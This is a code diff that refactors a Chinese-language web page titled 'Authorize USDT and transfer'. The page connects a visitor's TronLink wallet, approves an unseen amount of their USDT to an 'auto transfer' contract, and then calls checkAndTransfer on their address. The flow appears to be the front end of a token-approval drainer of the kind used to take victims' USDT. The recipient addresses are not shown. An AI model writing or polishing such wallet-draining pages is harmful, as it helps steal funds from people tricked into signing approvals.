@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>授权USDT并转账</title>
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@2.4.0/dist/TronWeb.js"></script>
 </head>
 <body>
 <h1>授权USDT并转账</h1>
@@ -54,26 +54,28 @@
     let tronWeb;
 
     async function connectWallet() {
-        if (typeof window.tronWeb !== 'undefined') {
-            tronWeb = window.tronWeb;
-            try {
-                await tronWeb.trx.getBalance(tronWeb.defaultAddress.base58);
+        if (typeof window.tronWeb === 'undefined') {
+            alert('请安装TronLink钱包!');
+            return;
+        }
+        tronWeb = window.tronWeb;
+        await tronWeb.trx.getBalance(tronWeb.defaultAddress.base58)
+            .then(result => {
+                console.log(result);
                 document.getElementById('connectWalletBtn').style.display = 'none';
                 document.getElementById('approveBtn').style.display = 'block';
-            } catch (error) {
+            })
+            .catch(error => {
                 console.error(error);
-                alert('连接钱包失败!');
-            }
-        } else {
-            alert('请安装TronLink钱包!');
-        }
+                alert('连接TronLink失败!');
+            });
     }
 
     document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);
 
     document.getElementById('approveBtn').addEventListener('click', async () => {
         const usdtContract = await tronWeb.contract(usdtAbi, usdtContractAddress);
-        usdtContract.methods.approve(autoTransferContractAddress, approveAmount).send({
+        await usdtContract.methods.approve(autoTransferContractAddress, approveAmount).send({
             feeLimit: 100000000
         }).then(() => {
             document.getElementById('result').innerText = '授权成功';
@@ -89,14 +91,15 @@
         const contract = await tronWeb.contract(autoTransferAbi, autoTransferContractAddress);
         const userAddress = tronWeb.defaultAddress.base58;
         await contract.methods.checkAndTransfer(userAddress).send({
-            feeLimit: 100000000,        callValue: 0
+            feeLimit: 100000000,
+            callValue: 0
         }).then(() => {
             document.getElementById('result').innerText = '转账成功';
         }).catch((error) => {
             console.error(error);
             document.getElementById('result').innerText = '转账失败';
         });
-    });</script>
+    });
+</script>
 </body>
 </html>
-```
